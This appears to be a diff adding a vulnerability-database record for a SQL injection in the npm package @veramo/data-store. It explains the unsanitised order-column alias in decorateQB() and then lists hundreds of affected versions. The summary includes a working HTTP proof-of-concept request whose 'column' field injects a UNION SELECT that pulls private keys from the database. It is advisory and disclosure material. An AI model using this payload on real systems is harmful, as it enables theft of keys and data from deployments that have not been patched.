@@ -1,0 +1,683 @@
+advisory_id: GHSA-38cw-85xc-xr9x
+datasource_id: github_osv/GHSA-38cw-85xc-xr9x
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-38cw-85xc-xr9x/GHSA-38cw-85xc-xr9x.json
+aliases: []
+summary: "Veramo is Vulnerable to SQL Injection in Veramo Data Store ORM\n## Summary\n\nAn SQL\
+  \ injection vulnerability exists in the `@veramo/data-store` package that allows any authenticated\
+  \ user to execute arbitrary SQL queries against the database. The vulnerability is caused\
+  \ by insufficient validation of the `column` parameter in the `order` array of query requests.\n\
+  \n## Details\n\n`packages/data-store/src/data-store-orm.ts` (lines 416-434)\n\nThe vulnerability\
+  \ exists in the `decorateQB()` function which processes query ordering parameters:\n\n```typescript\n\
+  function decorateQB(\n  qb: SelectQueryBuilder<any>,\n  tableName: string,\n  input: FindArgs<any>,\n\
+  ): SelectQueryBuilder<any> {\n  if (input?.skip) qb = qb.offset(input.skip)\n  if (input?.take)\
+  \ qb = qb.limit(input.take)\n\n  if (input?.order) {\n    for (const item of input.order)\
+  \ {\n      qb = qb.addSelect(\n        qb.connection.driver.escape(tableName) + '.' + qb.connection.driver.escape(item.column),\n\
+  \        item.column,\n      )\n      qb = qb.orderBy(qb.connection.driver.escape(item.column),\
+  \ item.direction)\n    }\n  }\n  return qb\n}\n```\n\n**Root Cause:**\n\n1. The `item.column`\
+  \ value from user input is passed directly as the **alias** parameter to `addSelect()` without\
+  \ any sanitization or validation\n2. While TypeScript defines allowed column types (e.g.,\
+  \ `TCredentialColumns = 'context' | 'type' | ...`), this is only compile-time checking\n3.\
+  \ At runtime, the function accepts `FindArgs<any>`, allowing arbitrary strings to bypass type\
+  \ restrictions\n4. TypeORM inserts the alias directly into the SQL query, enabling SQL injection\n\
+  \n**Affected Endpoints:**\n\nAll endpoints are located in `packages/data-store/src/data-store-orm.ts`:\n\
+  \n| Endpoint | Method | Line |\n|----------|--------|------|\n| `dataStoreORMGetIdentifiers`\
+  \ | identifiersQuery() | 85-98 |\n| `dataStoreORMGetMessages` | messagesQuery() | 129-153\
+  \ |\n| `dataStoreORMGetVerifiableCredentialsByClaims` | claimsQuery() | 168-198 |\n| `dataStoreORMGetVerifiableCredentials`\
+  \ | credentialsQuery() | 227-252 |\n| `dataStoreORMGetVerifiablePresentations` | presentationsQuery()\
+  \ | 275-297 |\n\nAll these methods call `decorateQB()` which processes the vulnerable `order`\
+  \ parameter.\n\n## PoC\n\n**Prerequisites:**\n\n- A running Veramo agent with the REST API\
+  \ exposed (e.g., via `@veramo/remote-server`)\n- Valid authentication credentials (Bearer\
+  \ token)\n- The agent uses `@veramo/data-store` with a SQLite or compatible database\n\n**Example\
+  \ Exploit to Extract Private Keys From DB:**\n\n```http\nPOST /agent/dataStoreORMGetVerifiableCredentialsByClaims\
+  \ HTTP/1.1\nHost: localhost:3332\nContent-Length: 811\nAuthorization: Bearer test123\nContent-Type:\
+  \ application/json\n\n{ \"where\":[\n    {\n      \"value\": [\n        \"string\"\n     \
+  \ ],\n      \"not\": true,\n      \"op\": \"foo\",\n\"column\":\"bar\"\n    }\n  ],\n \n \
+  \ \"skip\": 0,\n  \"take\": 11111232323230,\n\"order\": [\n    {\n      \"direction\": \"\
+  ASC\",\"column\":\"issuanceDate\\\" AS \\\"issuanceDate\\\" FROM \\\"claim\\\" \\\"claim\\\
+  \" LEFT JOIN \\\"identifier\\\" \\\"issuer\\\" ON \\\"issuer\\\".\\\"did\\\"=\\\"claim\\\"\
+  .\\\"issuerDid\\\"  LEFT JOIN \\\"identifier\\\" \\\"subject\\\" ON \\\"subject\\\".\\\"did\\\
+  \"=\\\"claim\\\".\\\"subjectDid\\\"  LEFT JOIN \\\"credential\\\" \\\"credential\\\" ON \\\
+  \"credential\\\".\\\"hash\\\"=\\\"claim\\\".\\\"credentialHash\\\" where not(claim.isObj in\
+  \ (?)) and 1=0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,(SELECT\
+  \ json_object('alias', alias, 'type', type, 'privateKeyHex', privateKeyHex) ),22,23,24,25,26,27,28,29\
+  \ from `private-key`-- -\"\n    }\n  ]\n}\n```\n\nsimilar exploit could be used against the\
+  \ other affected endpoints\n\n## Impact\n\n**Attack capabilities:**\n\n- Complete database\
+  \ read access\n- Reading or write files into fs depending on dbms used\n- Database-specific\
+  \ escalation paths\n- Dos through timebased or multiple long running queries"
+impacted_packages:
+  - purl: pkg:npm/%40veramo/data-store
+    affected_versions: vers:npm/<6.0.2
+    fixed_versions: vers:npm/6.0.2
+    affected_packages:
+      - pkg:npm/%40veramo/data-store@0.0.42
+      - pkg:npm/%40veramo/data-store@1.0.1-next.1149
+      - pkg:npm/%40veramo/data-store@1.0.1
+      - pkg:npm/%40veramo/data-store@1.0.2-next.0
+      - pkg:npm/%40veramo/data-store@1.0.2-next.1
+      - pkg:npm/%40veramo/data-store@1.0.2-next.2
+      - pkg:npm/%40veramo/data-store@1.0.2-next.3
+      - pkg:npm/%40veramo/data-store@1.0.2-next.4
+      - pkg:npm/%40veramo/data-store@1.0.2-next.5
+      - pkg:npm/%40veramo/data-store@1.0.2-next.6
+      - pkg:npm/%40veramo/data-store@1.0.2-next.7
+      - pkg:npm/%40veramo/data-store@1.0.2-next.8
+      - pkg:npm/%40veramo/data-store@1.0.2-next.9
+      - pkg:npm/%40veramo/data-store@1.0.2-next.11
+      - pkg:npm/%40veramo/data-store@1.0.2-next.12
+      - pkg:npm/%40veramo/data-store@1.0.2-next.13
+      - pkg:npm/%40veramo/data-store@1.0.2-next.14
+      - pkg:npm/%40veramo/data-store@1.0.2-next.15
+      - pkg:npm/%40veramo/data-store@1.0.2-next.16
+      - pkg:npm/%40veramo/data-store@1.0.2-next.17
+      - pkg:npm/%40veramo/data-store@1.0.2-next.18
+      - pkg:npm/%40veramo/data-store@1.0.2-next.20
+      - pkg:npm/%40veramo/data-store@1.1.0
+      - pkg:npm/%40veramo/data-store@1.1.1-experimental.39
+      - pkg:npm/%40veramo/data-store@1.1.1-experimental.41
+      - pkg:npm/%40veramo/data-store@1.1.1-experimental.59
+      - pkg:npm/%40veramo/data-store@1.1.1-experimental.61
+      - pkg:npm/%40veramo/data-store@1.1.1-experimental.63
+      - pkg:npm/%40veramo/data-store@1.1.1-experimental.67
+      - pkg:npm/%40veramo/data-store@1.1.1-experimental.69
+      - pkg:npm/%40veramo/data-store@1.1.1-experimental.70
+      - pkg:npm/%40veramo/data-store@1.1.1-experimental.72
+      - pkg:npm/%40veramo/data-store@1.1.1-next.1
+      - pkg:npm/%40veramo/data-store@1.1.1-next.2
+      - pkg:npm/%40veramo/data-store@1.1.1-next.3
+      - pkg:npm/%40veramo/data-store@1.1.1-next.4
+      - pkg:npm/%40veramo/data-store@1.1.1-next.5
+      - pkg:npm/%40veramo/data-store@1.1.1-next.6
+      - pkg:npm/%40veramo/data-store@1.1.1-next.7
+      - pkg:npm/%40veramo/data-store@1.1.1-next.8
+      - pkg:npm/%40veramo/data-store@1.1.1-next.9
+      - pkg:npm/%40veramo/data-store@1.1.1-next.10
+      - pkg:npm/%40veramo/data-store@1.1.1-next.11
+      - pkg:npm/%40veramo/data-store@1.1.1-next.13
+      - pkg:npm/%40veramo/data-store@1.1.1-next.14
+      - pkg:npm/%40veramo/data-store@1.1.1-next.15
+      - pkg:npm/%40veramo/data-store@1.1.1-next.16
+      - pkg:npm/%40veramo/data-store@1.1.1-next.17
+      - pkg:npm/%40veramo/data-store@1.1.1-next.18
+      - pkg:npm/%40veramo/data-store@1.1.1-next.19
+      - pkg:npm/%40veramo/data-store@1.1.1-next.20
+      - pkg:npm/%40veramo/data-store@1.1.1-next.21
+      - pkg:npm/%40veramo/data-store@1.1.1-next.23
+      - pkg:npm/%40veramo/data-store@1.1.1-next.24
+      - pkg:npm/%40veramo/data-store@1.1.1-next.25
+      - pkg:npm/%40veramo/data-store@1.1.1-next.26
+      - pkg:npm/%40veramo/data-store@1.1.1-next.27
+      - pkg:npm/%40veramo/data-store@1.1.1-next.28
+      - pkg:npm/%40veramo/data-store@1.1.1-next.29
+      - pkg:npm/%40veramo/data-store@1.1.1-next.30
+      - pkg:npm/%40veramo/data-store@1.1.1-next.31
+      - pkg:npm/%40veramo/data-store@1.1.1-next.32
+      - pkg:npm/%40veramo/data-store@1.1.1-next.33
+      - pkg:npm/%40veramo/data-store@1.1.1-next.34
+      - pkg:npm/%40veramo/data-store@1.1.1-next.36
+      - pkg:npm/%40veramo/data-store@1.1.1-next.37
+      - pkg:npm/%40veramo/data-store@1.1.1-next.38
+      - pkg:npm/%40veramo/data-store@1.1.1-next.39
+      - pkg:npm/%40veramo/data-store@1.1.1-next.40
+      - pkg:npm/%40veramo/data-store@1.1.1-next.41
+      - pkg:npm/%40veramo/data-store@1.1.1-unstable.71
+      - pkg:npm/%40veramo/data-store@1.1.1-unstable.72
+      - pkg:npm/%40veramo/data-store@1.1.1-unstable.75
+      - pkg:npm/%40veramo/data-store@1.1.1-unstable.76
+      - pkg:npm/%40veramo/data-store@1.1.1-unstable.88
+      - pkg:npm/%40veramo/data-store@1.1.1-unstable.89
+      - pkg:npm/%40veramo/data-store@1.1.2-next.42
+      - pkg:npm/%40veramo/data-store@1.1.2-next.43
+      - pkg:npm/%40veramo/data-store@1.1.2
+      - pkg:npm/%40veramo/data-store@1.1.3-next.44
+      - pkg:npm/%40veramo/data-store@1.1.3-next.46
+      - pkg:npm/%40veramo/data-store@1.2.0
+      - pkg:npm/%40veramo/data-store@1.2.1-next.1
+      - pkg:npm/%40veramo/data-store@1.2.1-next.2
+      - pkg:npm/%40veramo/data-store@1.2.1-next.3
+      - pkg:npm/%40veramo/data-store@1.2.1-next.5
+      - pkg:npm/%40veramo/data-store@1.2.2-next.2
+      - pkg:npm/%40veramo/data-store@1.2.2-next.3
+      - pkg:npm/%40veramo/data-store@1.2.2-next.4
+      - pkg:npm/%40veramo/data-store@1.2.2-next.5
+      - pkg:npm/%40veramo/data-store@1.2.2-next.6
+      - pkg:npm/%40veramo/data-store@1.2.2-next.7
+      - pkg:npm/%40veramo/data-store@1.2.2-next.8
+      - pkg:npm/%40veramo/data-store@1.2.2-next.10
+      - pkg:npm/%40veramo/data-store@1.2.3-next.10
+      - pkg:npm/%40veramo/data-store@1.2.3-next.12
+      - pkg:npm/%40veramo/data-store@1.2.3-next.13
+      - pkg:npm/%40veramo/data-store@1.2.3-next.14
+      - pkg:npm/%40veramo/data-store@1.2.3-next.15
+      - pkg:npm/%40veramo/data-store@1.2.3-next.22
+      - pkg:npm/%40veramo/data-store@1.2.3-next.23
+      - pkg:npm/%40veramo/data-store@1.2.3-next.24
+      - pkg:npm/%40veramo/data-store@1.2.3-next.25
+      - pkg:npm/%40veramo/data-store@1.2.3-next.27
+      - pkg:npm/%40veramo/data-store@1.2.3-next.28
+      - pkg:npm/%40veramo/data-store@1.2.3-next.29
+      - pkg:npm/%40veramo/data-store@1.2.3-next.30
+      - pkg:npm/%40veramo/data-store@1.2.3-next.31
+      - pkg:npm/%40veramo/data-store@1.2.3-next.32
+      - pkg:npm/%40veramo/data-store@1.2.3-next.33
+      - pkg:npm/%40veramo/data-store@1.2.3-next.34
+      - pkg:npm/%40veramo/data-store@1.2.3-next.35
+      - pkg:npm/%40veramo/data-store@1.2.3-next.36
+      - pkg:npm/%40veramo/data-store@1.2.3-next.41
+      - pkg:npm/%40veramo/data-store@1.2.3-next.42
+      - pkg:npm/%40veramo/data-store@1.2.3-next.43
+      - pkg:npm/%40veramo/data-store@1.2.3-next.44
+      - pkg:npm/%40veramo/data-store@1.2.3-next.45
+      - pkg:npm/%40veramo/data-store@1.2.3-next.46
+      - pkg:npm/%40veramo/data-store@1.2.3-next.50
+      - pkg:npm/%40veramo/data-store@1.2.3-next.52
+      - pkg:npm/%40veramo/data-store@1.2.3-unstable.25
+      - pkg:npm/%40veramo/data-store@1.2.3-unstable.26
+      - pkg:npm/%40veramo/data-store@1.2.3-unstable.41
+      - pkg:npm/%40veramo/data-store@2.0.0
+      - pkg:npm/%40veramo/data-store@2.0.1-next.2
+      - pkg:npm/%40veramo/data-store@2.0.1-next.3
+      - pkg:npm/%40veramo/data-store@2.0.1-next.4
+      - pkg:npm/%40veramo/data-store@2.0.1-next.6
+      - pkg:npm/%40veramo/data-store@2.0.1-unstable.13
+      - pkg:npm/%40veramo/data-store@2.0.1-unstable.15
+      - pkg:npm/%40veramo/data-store@2.0.2-next.7
+      - pkg:npm/%40veramo/data-store@2.0.2-next.8
+      - pkg:npm/%40veramo/data-store@2.0.2-next.9
+      - pkg:npm/%40veramo/data-store@2.0.2-next.10
+      - pkg:npm/%40veramo/data-store@2.0.2-next.11
+      - pkg:npm/%40veramo/data-store@2.0.2-next.12
+      - pkg:npm/%40veramo/data-store@2.0.2-next.13
+      - pkg:npm/%40veramo/data-store@2.0.2-next.14
+      - pkg:npm/%40veramo/data-store@2.0.2-next.15
+      - pkg:npm/%40veramo/data-store@2.0.2-next.17
+      - pkg:npm/%40veramo/data-store@2.1.0
+      - pkg:npm/%40veramo/data-store@2.1.1-next.1
+      - pkg:npm/%40veramo/data-store@2.1.1-next.3
+      - pkg:npm/%40veramo/data-store@2.1.2-next.3
+      - pkg:npm/%40veramo/data-store@2.1.2-next.4
+      - pkg:npm/%40veramo/data-store@2.1.2-next.5
+      - pkg:npm/%40veramo/data-store@2.1.2-next.6
+      - pkg:npm/%40veramo/data-store@2.1.2-next.7
+      - pkg:npm/%40veramo/data-store@2.1.2-next.8
+      - pkg:npm/%40veramo/data-store@2.1.2-next.9
+      - pkg:npm/%40veramo/data-store@2.1.2-next.10
+      - pkg:npm/%40veramo/data-store@2.1.2-next.11
+      - pkg:npm/%40veramo/data-store@2.1.2-next.12
+      - pkg:npm/%40veramo/data-store@2.1.2-next.13
+      - pkg:npm/%40veramo/data-store@2.1.2-next.14
+      - pkg:npm/%40veramo/data-store@2.1.2-next.15
+      - pkg:npm/%40veramo/data-store@2.1.2-next.16
+      - pkg:npm/%40veramo/data-store@2.1.2-next.20
+      - pkg:npm/%40veramo/data-store@2.1.3-next.20
+      - pkg:npm/%40veramo/data-store@2.1.3-next.21
+      - pkg:npm/%40veramo/data-store@2.1.3-next.22
+      - pkg:npm/%40veramo/data-store@2.1.3-next.23
+      - pkg:npm/%40veramo/data-store@2.1.3-next.24
+      - pkg:npm/%40veramo/data-store@2.1.3-next.25
+      - pkg:npm/%40veramo/data-store@2.1.3-next.26
+      - pkg:npm/%40veramo/data-store@2.1.3-next.27
+      - pkg:npm/%40veramo/data-store@2.1.3-next.28
+      - pkg:npm/%40veramo/data-store@2.1.3-next.29
+      - pkg:npm/%40veramo/data-store@2.1.3-next.30
+      - pkg:npm/%40veramo/data-store@2.1.3-next.31
+      - pkg:npm/%40veramo/data-store@2.1.4-next.32
+      - pkg:npm/%40veramo/data-store@3.0.0
+      - pkg:npm/%40veramo/data-store@3.0.1-next.1
+      - pkg:npm/%40veramo/data-store@3.0.1-next.2
+      - pkg:npm/%40veramo/data-store@3.0.1-next.3
+      - pkg:npm/%40veramo/data-store@3.0.1-next.4
+      - pkg:npm/%40veramo/data-store@3.0.1-next.5
+      - pkg:npm/%40veramo/data-store@3.0.1-next.6
+      - pkg:npm/%40veramo/data-store@3.0.1-next.7
+      - pkg:npm/%40veramo/data-store@3.0.1-next.8
+      - pkg:npm/%40veramo/data-store@3.0.1-next.9
+      - pkg:npm/%40veramo/data-store@3.0.1-next.10
+      - pkg:npm/%40veramo/data-store@3.0.1-next.29
+      - pkg:npm/%40veramo/data-store@3.0.1-next.30
+      - pkg:npm/%40veramo/data-store@3.0.1-next.32
+      - pkg:npm/%40veramo/data-store@3.1.0
+      - pkg:npm/%40veramo/data-store@3.1.1-next.1
+      - pkg:npm/%40veramo/data-store@3.1.1-next.2
+      - pkg:npm/%40veramo/data-store@3.1.1-next.3
+      - pkg:npm/%40veramo/data-store@3.1.1-next.4
+      - pkg:npm/%40veramo/data-store@3.1.1-next.5
+      - pkg:npm/%40veramo/data-store@3.1.1-next.6
+      - pkg:npm/%40veramo/data-store@3.1.1-next.7
+      - pkg:npm/%40veramo/data-store@3.1.1-next.8
+      - pkg:npm/%40veramo/data-store@3.1.1-next.9
+      - pkg:npm/%40veramo/data-store@3.1.1-next.10
+      - pkg:npm/%40veramo/data-store@3.1.1-next.11
+      - pkg:npm/%40veramo/data-store@3.1.1-next.12
+      - pkg:npm/%40veramo/data-store@3.1.1-next.13
+      - pkg:npm/%40veramo/data-store@3.1.1-next.14
+      - pkg:npm/%40veramo/data-store@3.1.1-next.15
+      - pkg:npm/%40veramo/data-store@3.1.1-next.16
+      - pkg:npm/%40veramo/data-store@3.1.1-next.17
+      - pkg:npm/%40veramo/data-store@3.1.1-next.18
+      - pkg:npm/%40veramo/data-store@3.1.1-next.19
+      - pkg:npm/%40veramo/data-store@3.1.1-next.20
+      - pkg:npm/%40veramo/data-store@3.1.1-next.21
+      - pkg:npm/%40veramo/data-store@3.1.1-next.22
+      - pkg:npm/%40veramo/data-store@3.1.1-next.23
+      - pkg:npm/%40veramo/data-store@3.1.1-next.24
+      - pkg:npm/%40veramo/data-store@3.1.1-next.25
+      - pkg:npm/%40veramo/data-store@3.1.1-next.26
+      - pkg:npm/%40veramo/data-store@3.1.1-next.29
+      - pkg:npm/%40veramo/data-store@3.1.2-next.28
+      - pkg:npm/%40veramo/data-store@3.1.2-next.29
+      - pkg:npm/%40veramo/data-store@3.1.2-next.30
+      - pkg:npm/%40veramo/data-store@3.1.2-next.31
+      - pkg:npm/%40veramo/data-store@3.1.2-next.32
+      - pkg:npm/%40veramo/data-store@3.1.2-next.33
+      - pkg:npm/%40veramo/data-store@3.1.2-next.34
+      - pkg:npm/%40veramo/data-store@3.1.2-next.35
+      - pkg:npm/%40veramo/data-store@3.1.2-next.36
+      - pkg:npm/%40veramo/data-store@3.1.2-next.37
+      - pkg:npm/%40veramo/data-store@3.1.2-next.39
+      - pkg:npm/%40veramo/data-store@3.1.2-next.40
+      - pkg:npm/%40veramo/data-store@3.1.2-next.41
+      - pkg:npm/%40veramo/data-store@3.1.2-next.42
+      - pkg:npm/%40veramo/data-store@3.1.2-next.43
+      - pkg:npm/%40veramo/data-store@3.1.2-next.44
+      - pkg:npm/%40veramo/data-store@3.1.2-next.46
+      - pkg:npm/%40veramo/data-store@3.1.2-next.47
+      - pkg:npm/%40veramo/data-store@3.1.2-next.48
+      - pkg:npm/%40veramo/data-store@3.1.2-next.49
+      - pkg:npm/%40veramo/data-store@3.1.2-next.50
+      - pkg:npm/%40veramo/data-store@3.1.2-next.51
+      - pkg:npm/%40veramo/data-store@3.1.2-next.52
+      - pkg:npm/%40veramo/data-store@3.1.2-next.53
+      - pkg:npm/%40veramo/data-store@3.1.2-next.55
+      - pkg:npm/%40veramo/data-store@3.1.2-next.56
+      - pkg:npm/%40veramo/data-store@3.1.2-next.57
+      - pkg:npm/%40veramo/data-store@3.1.2-next.58
+      - pkg:npm/%40veramo/data-store@3.1.2-next.59
+      - pkg:npm/%40veramo/data-store@3.1.2-next.65
+      - pkg:npm/%40veramo/data-store@3.1.2-next.66
+      - pkg:npm/%40veramo/data-store@3.1.2-next.67
+      - pkg:npm/%40veramo/data-store@3.1.2-next.68
+      - pkg:npm/%40veramo/data-store@3.1.2-next.69
+      - pkg:npm/%40veramo/data-store@3.1.2-next.70
+      - pkg:npm/%40veramo/data-store@3.1.2-next.78
+      - pkg:npm/%40veramo/data-store@3.1.2-next.79
+      - pkg:npm/%40veramo/data-store@3.1.2-next.80
+      - pkg:npm/%40veramo/data-store@3.1.2-next.81
+      - pkg:npm/%40veramo/data-store@3.1.2-next.82
+      - pkg:npm/%40veramo/data-store@3.1.2-next.83
+      - pkg:npm/%40veramo/data-store@3.1.2-next.84
+      - pkg:npm/%40veramo/data-store@3.1.2-next.85
+      - pkg:npm/%40veramo/data-store@3.1.2-next.86
+      - pkg:npm/%40veramo/data-store@3.1.2-next.87
+      - pkg:npm/%40veramo/data-store@3.1.2-next.88
+      - pkg:npm/%40veramo/data-store@3.1.2-next.89
+      - pkg:npm/%40veramo/data-store@3.1.2-next.90
+      - pkg:npm/%40veramo/data-store@3.1.2-next.91
+      - pkg:npm/%40veramo/data-store@3.1.2-next.92
+      - pkg:npm/%40veramo/data-store@3.1.2-next.94
+      - pkg:npm/%40veramo/data-store@3.1.2-next.95
+      - pkg:npm/%40veramo/data-store@3.1.2-next.96
+      - pkg:npm/%40veramo/data-store@3.1.2-next.97
+      - pkg:npm/%40veramo/data-store@3.1.2-next.98
+      - pkg:npm/%40veramo/data-store@3.1.2-next.99
+      - pkg:npm/%40veramo/data-store@3.1.2-next.100
+      - pkg:npm/%40veramo/data-store@3.1.2-next.101
+      - pkg:npm/%40veramo/data-store@3.1.2-next.102
+      - pkg:npm/%40veramo/data-store@3.1.2-next.103
+      - pkg:npm/%40veramo/data-store@3.1.2-next.105
+      - pkg:npm/%40veramo/data-store@3.1.2-next.106
+      - pkg:npm/%40veramo/data-store@3.1.3-next.112
+      - pkg:npm/%40veramo/data-store@3.1.3-next.114
+      - pkg:npm/%40veramo/data-store@3.1.3
+      - pkg:npm/%40veramo/data-store@3.1.4
+      - pkg:npm/%40veramo/data-store@3.1.5-next.114
+      - pkg:npm/%40veramo/data-store@3.1.5-next.115
+      - pkg:npm/%40veramo/data-store@3.1.5-next.116
+      - pkg:npm/%40veramo/data-store@3.1.5-next.117
+      - pkg:npm/%40veramo/data-store@3.1.5-next.119
+      - pkg:npm/%40veramo/data-store@3.1.5-next.120
+      - pkg:npm/%40veramo/data-store@3.1.5-next.121
+      - pkg:npm/%40veramo/data-store@3.1.5-next.122
+      - pkg:npm/%40veramo/data-store@3.1.5-next.123
+      - pkg:npm/%40veramo/data-store@3.1.5-next.125
+      - pkg:npm/%40veramo/data-store@3.1.5-next.126
+      - pkg:npm/%40veramo/data-store@3.1.5-next.127
+      - pkg:npm/%40veramo/data-store@3.1.6-next.129
+      - pkg:npm/%40veramo/data-store@3.1.6-next.130
+      - pkg:npm/%40veramo/data-store@3.1.6-next.131
+      - pkg:npm/%40veramo/data-store@3.1.6-next.132
+      - pkg:npm/%40veramo/data-store@3.1.6-next.133
+      - pkg:npm/%40veramo/data-store@3.1.6-next.134
+      - pkg:npm/%40veramo/data-store@3.1.6-next.137
+      - pkg:npm/%40veramo/data-store@3.1.6-next.138
+      - pkg:npm/%40veramo/data-store@3.1.6-next.139
+      - pkg:npm/%40veramo/data-store@3.1.6-next.140
+      - pkg:npm/%40veramo/data-store@3.1.6-next.141
+      - pkg:npm/%40veramo/data-store@3.1.6-next.142
+      - pkg:npm/%40veramo/data-store@3.1.6-next.143
+      - pkg:npm/%40veramo/data-store@3.1.6-next.144
+      - pkg:npm/%40veramo/data-store@3.1.6-next.145
+      - pkg:npm/%40veramo/data-store@3.1.6-next.146
+      - pkg:npm/%40veramo/data-store@3.1.6-next.147
+      - pkg:npm/%40veramo/data-store@3.1.6-next.148
+      - pkg:npm/%40veramo/data-store@3.1.6-next.149
+      - pkg:npm/%40veramo/data-store@3.1.6-next.150
+      - pkg:npm/%40veramo/data-store@3.1.6-next.151
+      - pkg:npm/%40veramo/data-store@3.1.6-next.152
+      - pkg:npm/%40veramo/data-store@3.1.6-next.153
+      - pkg:npm/%40veramo/data-store@3.1.6-next.154
+      - pkg:npm/%40veramo/data-store@3.1.6-next.156
+      - pkg:npm/%40veramo/data-store@3.1.6-next.157
+      - pkg:npm/%40veramo/data-store@3.1.6-next.158
+      - pkg:npm/%40veramo/data-store@3.1.6-next.159
+      - pkg:npm/%40veramo/data-store@3.1.6-next.160
+      - pkg:npm/%40veramo/data-store@3.1.6-next.163
+      - pkg:npm/%40veramo/data-store@3.1.6-next.164
+      - pkg:npm/%40veramo/data-store@3.1.6-next.165
+      - pkg:npm/%40veramo/data-store@3.1.6-next.166
+      - pkg:npm/%40veramo/data-store@3.1.6-next.167
+      - pkg:npm/%40veramo/data-store@3.1.6-next.168
+      - pkg:npm/%40veramo/data-store@3.1.6-next.169
+      - pkg:npm/%40veramo/data-store@3.1.6-next.170
+      - pkg:npm/%40veramo/data-store@3.1.6-next.172
+      - pkg:npm/%40veramo/data-store@4.0.0
+      - pkg:npm/%40veramo/data-store@4.0.1-next.1
+      - pkg:npm/%40veramo/data-store@4.0.1-next.2
+      - pkg:npm/%40veramo/data-store@4.0.1-next.3
+      - pkg:npm/%40veramo/data-store@4.0.1-next.5
+      - pkg:npm/%40veramo/data-store@4.0.1-next.6
+      - pkg:npm/%40veramo/data-store@4.0.1-next.7
+      - pkg:npm/%40veramo/data-store@4.0.1-next.8
+      - pkg:npm/%40veramo/data-store@4.0.1-next.10
+      - pkg:npm/%40veramo/data-store@4.0.1-next.11
+      - pkg:npm/%40veramo/data-store@4.0.1-next.12
+      - pkg:npm/%40veramo/data-store@4.0.1-unstable.2
+      - pkg:npm/%40veramo/data-store@4.0.1-unstable.4
+      - pkg:npm/%40veramo/data-store@4.0.2-next.9
+      - pkg:npm/%40veramo/data-store@4.0.2-next.12
+      - pkg:npm/%40veramo/data-store@4.0.2-next.13
+      - pkg:npm/%40veramo/data-store@4.0.2-next.14
+      - pkg:npm/%40veramo/data-store@4.0.2-next.15
+      - pkg:npm/%40veramo/data-store@4.0.2-next.18
+      - pkg:npm/%40veramo/data-store@4.0.2-next.19
+      - pkg:npm/%40veramo/data-store@4.0.2-next.20
+      - pkg:npm/%40veramo/data-store@4.0.2-next.21
+      - pkg:npm/%40veramo/data-store@4.0.2-next.22
+      - pkg:npm/%40veramo/data-store@4.0.2-next.23
+      - pkg:npm/%40veramo/data-store@4.0.2
+      - pkg:npm/%40veramo/data-store@4.0.3-next.15
+      - pkg:npm/%40veramo/data-store@4.0.3-next.17
+      - pkg:npm/%40veramo/data-store@4.1.0
+      - pkg:npm/%40veramo/data-store@4.1.1-next.1
+      - pkg:npm/%40veramo/data-store@4.1.1-next.3
+      - pkg:npm/%40veramo/data-store@4.1.1
+      - pkg:npm/%40veramo/data-store@4.1.2-next.3
+      - pkg:npm/%40veramo/data-store@4.1.2-next.5
+      - pkg:npm/%40veramo/data-store@4.1.3-next.5
+      - pkg:npm/%40veramo/data-store@4.1.3-next.6
+      - pkg:npm/%40veramo/data-store@4.1.3-next.7
+      - pkg:npm/%40veramo/data-store@4.1.3-next.8
+      - pkg:npm/%40veramo/data-store@4.1.3-next.9
+      - pkg:npm/%40veramo/data-store@4.1.3-next.10
+      - pkg:npm/%40veramo/data-store@4.1.3-next.11
+      - pkg:npm/%40veramo/data-store@4.1.3-next.12
+      - pkg:npm/%40veramo/data-store@4.1.3-next.19
+      - pkg:npm/%40veramo/data-store@4.1.3-next.21
+      - pkg:npm/%40veramo/data-store@4.1.3-next.22
+      - pkg:npm/%40veramo/data-store@4.2.0
+      - pkg:npm/%40veramo/data-store@4.2.1-next.1
+      - pkg:npm/%40veramo/data-store@4.2.1-next.2
+      - pkg:npm/%40veramo/data-store@4.2.1-next.3
+      - pkg:npm/%40veramo/data-store@4.2.1-next.4
+      - pkg:npm/%40veramo/data-store@4.2.1-next.5
+      - pkg:npm/%40veramo/data-store@4.2.1-next.6
+      - pkg:npm/%40veramo/data-store@4.2.1-next.7
+      - pkg:npm/%40veramo/data-store@4.2.1-next.9
+      - pkg:npm/%40veramo/data-store@4.2.1-next.15
+      - pkg:npm/%40veramo/data-store@4.2.1-unstable.9
+      - pkg:npm/%40veramo/data-store@4.3.0
+      - pkg:npm/%40veramo/data-store@4.3.1-next.4
+      - pkg:npm/%40veramo/data-store@4.3.1-next.7
+      - pkg:npm/%40veramo/data-store@4.3.1-next.9
+      - pkg:npm/%40veramo/data-store@4.3.1-next.10
+      - pkg:npm/%40veramo/data-store@4.3.1-next.11
+      - pkg:npm/%40veramo/data-store@4.3.1-next.12
+      - pkg:npm/%40veramo/data-store@4.3.1-next.13
+      - pkg:npm/%40veramo/data-store@4.3.1-next.14
+      - pkg:npm/%40veramo/data-store@4.3.1-next.16
+      - pkg:npm/%40veramo/data-store@4.3.1-unstable.0
+      - pkg:npm/%40veramo/data-store@5.0.0
+      - pkg:npm/%40veramo/data-store@5.0.1-next.1
+      - pkg:npm/%40veramo/data-store@5.0.1-next.2
+      - pkg:npm/%40veramo/data-store@5.0.1-next.3
+      - pkg:npm/%40veramo/data-store@5.0.1-next.4
+      - pkg:npm/%40veramo/data-store@5.0.1-next.5
+      - pkg:npm/%40veramo/data-store@5.0.1-next.6
+      - pkg:npm/%40veramo/data-store@5.0.1-next.7
+      - pkg:npm/%40veramo/data-store@5.0.1-next.8
+      - pkg:npm/%40veramo/data-store@5.0.1-next.9
+      - pkg:npm/%40veramo/data-store@5.0.1-next.10
+      - pkg:npm/%40veramo/data-store@5.0.1-next.11
+      - pkg:npm/%40veramo/data-store@5.0.1-next.12
+      - pkg:npm/%40veramo/data-store@5.0.1-next.13
+      - pkg:npm/%40veramo/data-store@5.0.1-next.14
+      - pkg:npm/%40veramo/data-store@5.0.1-next.15
+      - pkg:npm/%40veramo/data-store@5.0.1-next.16
+      - pkg:npm/%40veramo/data-store@5.0.1-next.17
+      - pkg:npm/%40veramo/data-store@5.0.1-next.19
+      - pkg:npm/%40veramo/data-store@5.1.0
+      - pkg:npm/%40veramo/data-store@5.1.1-next.2
+      - pkg:npm/%40veramo/data-store@5.1.2-next.2
+      - pkg:npm/%40veramo/data-store@5.1.2-next.4
+      - pkg:npm/%40veramo/data-store@5.1.2-next.5
+      - pkg:npm/%40veramo/data-store@5.1.2
+      - pkg:npm/%40veramo/data-store@5.1.3-next.5
